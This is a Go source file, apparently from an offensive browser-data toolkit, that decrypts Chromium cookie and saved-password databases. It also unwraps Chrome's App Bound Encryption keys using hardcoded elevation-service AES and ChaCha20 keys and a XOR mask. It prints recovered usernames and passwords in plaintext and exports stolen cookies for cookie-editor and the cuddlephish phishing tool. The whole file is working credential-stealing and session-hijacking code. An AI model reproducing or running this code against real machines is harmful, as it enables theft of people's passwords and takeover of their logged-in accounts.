// Package offlinedecrypt provides offline decryption of Chromium browser SQLite databases
// (Cookies and Login Data) given a previously extracted encryption key.
// Ported from the cookie-monster project's decrypt.py.
package offlinedecrypt

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/json"
	"fmt"
	"os"
	"time"

	_ "modernc.org/sqlite"

	"github.com/moond4rk/hackbrowserdata/crypto"
)

// chromiumEpoch is the base time for Chromium timestamp fields (microseconds since Jan 1 1601).
var chromiumEpoch = time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)

// chromiumTime converts a Chromium microsecond timestamp to time.Time.
func chromiumTime(us int64) time.Time {
	return chromiumEpoch.Add(time.Duration(us) * time.Microsecond)
}

// Cookie holds a single decrypted browser cookie.
type Cookie struct {
	Host       string    `json:"domain"`
	Path       string    `json:"path"`
	Name       string    `json:"name"`
	Value      string    `json:"value"`
	Secure     bool      `json:"secure"`
	HTTPOnly   bool      `json:"httpOnly"`
	HasExpires bool      `json:"-"`
	Expires    time.Time `json:"expirationDate,omitempty"`
}

// LoginData holds a single decrypted browser login credential.
type LoginData struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

// CookieEditorEntry is the cookie-editor browser extension import/export format.
type CookieEditorEntry struct {
	Domain         string  `json:"domain"`
	ExpirationDate float64 `json:"expirationDate"`
	HostOnly       bool    `json:"hostOnly"`
	HTTPOnly       bool    `json:"httpOnly"`
	Name           string  `json:"name"`
	Path           string  `json:"path"`
	SameSite       *string `json:"sameSite"`
	Secure         bool    `json:"secure"`
	Session        bool    `json:"session"`
	StoreID        *string `json:"storeId"`
	Value          string  `json:"value"`
}

// CuddlePhishOutput is the cuddlephish tool cookie import format.
// See https://github.com/fkasler/cuddlephish
type CuddlePhishOutput struct {
	URL          string              `json:"url"`
	Cookies      []CuddlePhishCookie `json:"cookies"`
	LocalStorage []interface{}       `json:"local_storage"`
}

// CuddlePhishCookie is a single cookie in the cuddlephish format.
type CuddlePhishCookie struct {
	Domain     string  `json:"domain"`
	Expires    float64 `json:"expires"`
	HTTPOnly   bool    `json:"httpOnly"`
	Name       string  `json:"name"`
	Path       string  `json:"path"`
	Priority   string  `json:"priority"`
	SameParty  bool    `json:"sameParty"`
	SameSite   string  `json:"sameSite"`
	Secure     bool    `json:"secure"`
	Session    bool    `json:"session"`
	Size       int     `json:"size"`
	SourcePort int     `json:"sourcePort"`
	Value      string  `json:"value"`
}

// DecryptCookies reads and decrypts all cookies from a Chromium Cookies SQLite file.
func DecryptCookies(dbPath string, key, masterKey []byte) ([]Cookie, error) {
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return nil, fmt.Errorf("open db: %w", err)
	}
	defer db.Close()

	rows, err := db.Query(`SELECT host_key, path, name, encrypted_value, expires_utc, has_expires, is_secure, is_httponly FROM cookies`)
	if err != nil {
		return nil, fmt.Errorf("query cookies: %w", err)
	}
	defer rows.Close()

	var cookies []Cookie
	for rows.Next() {
		var (
			host, path, name        string
			encryptedValue          []byte
			expiresUTC              int64
			hasExpires, secure, hto int
		)
		if err := rows.Scan(&host, &path, &name, &encryptedValue, &expiresUTC, &hasExpires, &secure, &hto); err != nil {
			continue
		}
		value, _ := decryptValue(encryptedValue, key, masterKey, false)
		c := Cookie{
			Host:       host,
			Path:       path,
			Name:       name,
			Value:      value,
			Secure:     secure != 0,
			HTTPOnly:   hto != 0,
			HasExpires: hasExpires != 0,
		}
		if hasExpires != 0 {
			c.Expires = chromiumTime(expiresUTC)
		}
		cookies = append(cookies, c)
	}
	return cookies, nil
}

// DecryptPasswords reads and decrypts all saved passwords from a Chromium Login Data SQLite file.
func DecryptPasswords(dbPath string, key, masterKey []byte) ([]LoginData, error) {
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return nil, fmt.Errorf("open db: %w", err)
	}
	defer db.Close()

	rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
	if err != nil {
		return nil, fmt.Errorf("query logins: %w", err)
	}
	defer rows.Close()

	var logins []LoginData
	for rows.Next() {
		var (
			url, username  string
			encryptedValue []byte
		)
		if err := rows.Scan(&url, &username, &encryptedValue); err != nil {
			continue
		}
		password, _ := decryptValue(encryptedValue, key, masterKey, true)
		logins = append(logins, LoginData{URL: url, Username: username, Password: password})
	}
	return logins, nil
}

// ExportCookieEditor writes decrypted cookies to w in cookie-editor JSON format.
func ExportCookieEditor(cookies []Cookie, w interface{ Write([]byte) (int, error) }) error {
	entries := make([]CookieEditorEntry, 0, len(cookies))
	for _, c := range cookies {
		var expDate float64
		if c.HasExpires {
			expDate = float64(c.Expires.Unix())
		} else {
			expDate = -1
		}
		entries = append(entries, CookieEditorEntry{
			Domain:         c.Host,
			ExpirationDate: expDate,
			HostOnly:       len(c.Host) == 0 || c.Host[0] != '.',
			HTTPOnly:       c.HTTPOnly,
			Name:           c.Name,
			Path:           c.Path,
			Secure:         c.Secure,
			Session:        !c.HasExpires,
			Value:          c.Value,
		})
	}
	enc := json.NewEncoder(w)
	enc.SetIndent("", "  ")
	enc.SetEscapeHTML(false)
	return enc.Encode(entries)
}

// ExportCuddlePhish writes decrypted cookies to w in cuddlephish JSON format.
func ExportCuddlePhish(cookies []Cookie, w interface{ Write([]byte) (int, error) }) error {
	var cpCookies []CuddlePhishCookie
	for _, c := range cookies {
		var expDate float64
		if c.HasExpires {
			expDate = float64(c.Expires.Unix())
		} else {
			expDate = -1
		}
		cpCookies = append(cpCookies, CuddlePhishCookie{
			Domain:     c.Host,
			Expires:    expDate,
			HTTPOnly:   c.HTTPOnly,
			Name:       c.Name,
			Path:       c.Path,
			Priority:   "Medium",
			SameSite:   "None",
			Secure:     c.Secure,
			Session:    !c.HasExpires,
			Size:       len(c.Name) + len(c.Value),
			SourcePort: 443,
			Value:      c.Value,
		})
	}
	out := CuddlePhishOutput{
		URL:          "about:blank",
		Cookies:      cpCookies,
		LocalStorage: []interface{}{},
	}
	enc := json.NewEncoder(w)
	enc.SetIndent("", "  ")
	enc.SetEscapeHTML(false)
	return enc.Encode(out)
}

// DecryptAppBoundKey decrypts a Chrome 130+ App Bound Encryption key blob.
// The blob format is: flag[1] + iv[12] + ciphertext[32] + tag[16] (flag=1: AES, flag=2: ChaCha20).
// Chrome 137+ adds an extra XOR step (flag=3).
// The hardcoded AES and ChaCha20 keys are the elevation service keys embedded in the Chrome binary.
// Reference: https://github.com/runassu/chrome_v20_decryption
func DecryptAppBoundKey(keyBlob []byte) ([]byte, error) {
	// Hardcoded elevation service AES key (base64: sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=)
	aesKey := []byte{
		0xb3, 0x1c, 0x6e, 0x24, 0x1a, 0xc8, 0x46, 0x72,
		0x8d, 0xa9, 0xc1, 0xfa, 0xc4, 0x93, 0x66, 0x51,
		0xcf, 0xfb, 0x94, 0x4d, 0x14, 0x39, 0xb8, 0x16,
		0x27, 0x66, 0xac, 0x6d, 0xa0, 0x28, 0x47, 0x87,
	}
	// Hardcoded elevation service ChaCha20 key
	chachaKey := []byte{
		0xe9, 0x8f, 0x37, 0xd7, 0xf4, 0xe1, 0xfa, 0x43,
		0x3d, 0x19, 0x30, 0x4d, 0xc2, 0x25, 0x80, 0x42,
		0x09, 0x0e, 0x2d, 0x1d, 0x7e, 0xea, 0x76, 0x70,
		0xd4, 0x1f, 0x73, 0x8d, 0x08, 0x72, 0x96, 0x60,
	}
	// XOR mask for Chrome 137+ (flag=3)
	xorKey := []byte{
		0xcc, 0xf8, 0xa1, 0xce, 0xc5, 0x66, 0x05, 0xb8,
		0x51, 0x75, 0x52, 0xba, 0x1a, 0x2d, 0x06, 0x1c,
		0x03, 0xa2, 0x9e, 0x90, 0x27, 0x4f, 0xb2, 0xfc,
		0xf5, 0x9b, 0xa4, 0xb7, 0x5c, 0x39, 0x23, 0x90,
	}

	if len(keyBlob) < 1+12+32+16 {
		return nil, fmt.Errorf("app bound key blob too short: %d bytes", len(keyBlob))
	}

	flag := keyBlob[0]
	iv := keyBlob[1 : 1+12]
	ciphertext := keyBlob[1+12 : 1+12+32]
	tag := keyBlob[1+12+32 : 1+12+32+16]
	combined := append(ciphertext, tag...)

	switch flag {
	case 1:
		return crypto.AESGCMDecrypt(aesKey, iv, combined)
	case 2:
		return crypto.ChaCha20Poly1305Decrypt(chachaKey, iv, combined)
	case 3:
		// Chrome 137+: iv and ciphertext layout shifts, then use XOR'd AES key
		if len(keyBlob) < 1+32+12+32+16 {
			return nil, fmt.Errorf("app bound key blob (flag=3) too short: %d bytes", len(keyBlob))
		}
		iv = keyBlob[1+32 : 1+32+12]
		ciphertext = keyBlob[1+32+12 : 1+32+12+32]
		tag = keyBlob[1+32+12+32 : 1+32+12+32+16]
		combined = append(ciphertext, tag...)
		// Fetch the Chrome AES key from the first 32 bytes and XOR it
		chromeAESKey := keyBlob[1 : 1+32]
		xoredKey := make([]byte, 32)
		for i := range xoredKey {
			xoredKey[i] = chromeAESKey[i] ^ xorKey[i]
		}
		return crypto.AESGCMDecrypt(xoredKey, iv, combined)
	default:
		return nil, fmt.Errorf("unsupported app bound key flag: %d", flag)
	}
}

// decryptValue decrypts a single encrypted column value from a Chromium SQLite database.
// isPassword=true adjusts the decrypted data offset for Login Data entries.
// Handles v10/v11 (older AES-GCM) and v20 (Chrome 127+ AES-GCM with app bound key).
func decryptValue(data, key, masterKey []byte, isPassword bool) (string, error) {
	if len(data) < 3 {
		return "", fmt.Errorf("encrypted value too short")
	}

	version := data[:3]

	switch {
	case bytes.Equal(version, []byte("v10")) || bytes.Equal(version, []byte("v11")):
		// v10/v11: AES-GCM with the master key (DPAPI-derived on Windows)
		// Layout: version[3] + nonce[12] + ciphertext + tag[16]
		if len(data) < 3+12+16 {
			return "", fmt.Errorf("v10/v11 data too short")
		}
		nonce := data[3 : 3+12]
		ciphertextWithTag := data[3+12:]
		decKey := key
		if isPassword && masterKey != nil {
			decKey = masterKey
		}
		plaintext, err := aesGCMDecryptRaw(decKey, nonce, ciphertextWithTag)
		if err != nil {
			return "", err
		}
		if !isPassword && len(plaintext) > 32 {
			return string(plaintext[32:]), nil
		}
		return string(plaintext), nil

	case bytes.Equal(version, []byte("v20")):
		// v20: Chrome 127+ App Bound Encryption
		// Layout: version[3] + nonce[12] + ciphertext + tag[16]
		if len(data) < 3+12+16 {
			return "", fmt.Errorf("v20 data too short")
		}
		nonce := data[3 : 3+12]
		ciphertextWithTag := data[3+12:]
		plaintext, err := aesGCMDecryptRaw(key, nonce, ciphertextWithTag)
		if err != nil {
			return "", err
		}
		if !isPassword && len(plaintext) > 32 {
			return string(plaintext[32:]), nil
		}
		return string(plaintext), nil

	default:
		return "", fmt.Errorf("unknown encryption version: %q", version)
	}
}

// aesGCMDecryptRaw decrypts AES-GCM data where ciphertextWithTag = ciphertext + 16-byte tag.
func aesGCMDecryptRaw(key, nonce, ciphertextWithTag []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return gcm.Open(nil, nonce, ciphertextWithTag, nil)
}

// PrintCookies prints cookies in a human-readable format to stdout.
func PrintCookies(cookies []Cookie) {
	for _, c := range cookies {
		fmt.Printf("Host: %s\nPath: %s\nName: %s\nCookie: %s;\n", c.Host, c.Path, c.Name, c.Value)
		if c.HasExpires {
			fmt.Printf("Expires: %s\n", c.Expires.Format("Jan 02 2006 15:04:05"))
		}
		fmt.Println()
	}
}

// PrintPasswords prints login credentials in a human-readable format to stdout.
func PrintPasswords(logins []LoginData) {
	for _, l := range logins {
		fmt.Printf("URL: %s\nUsername: %s\nPassword: %s\n\n", l.URL, l.Username, l.Password)
	}
}

// TimestampedFilename returns a filename with the current UTC timestamp.
// Example: prefix_2025-01-15_14-30-00.json
func TimestampedFilename(prefix string) string {
	return fmt.Sprintf("%s_%s.json", prefix, time.Now().UTC().Format("2006-01-02_15-04-05"))
}

// WriteJSON encodes v as indented JSON to the named file, creating it if it doesn't exist.
func WriteJSON(filename string, v interface{}) error {
	f, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer f.Close()
	enc := json.NewEncoder(f)
	enc.SetIndent("", "  ")
	enc.SetEscapeHTML(false)
	return enc.Encode(v)
}
